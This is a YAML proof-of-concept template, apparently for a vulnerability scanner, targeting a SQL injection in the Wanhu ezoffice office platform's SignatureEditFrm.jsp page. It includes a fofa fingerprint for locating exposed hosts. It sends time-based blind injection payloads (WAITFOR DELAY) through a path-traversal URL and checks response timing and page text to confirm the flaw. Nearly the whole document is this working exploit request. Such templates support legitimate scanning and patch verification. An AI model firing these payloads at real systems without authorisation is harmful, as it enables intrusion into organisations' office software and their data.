id: poc-yaml-ezoffice-signatureeditfrm-sqli
info:
  name: 万户协同办公平台ezoffice SignatureEditFrm.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 万户OA ezoffice
  fofa: Ezoffice
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(body,\"\
    印签管理\") &&\ncontains(body,\"请输入印签名\")\n"
- method: GET
  path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:{{.t3}}%27--
  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\ncontains(body,\"\
    印签管理\") &&\ncontains(body,\"请输入印签名\")\n"
transport: http
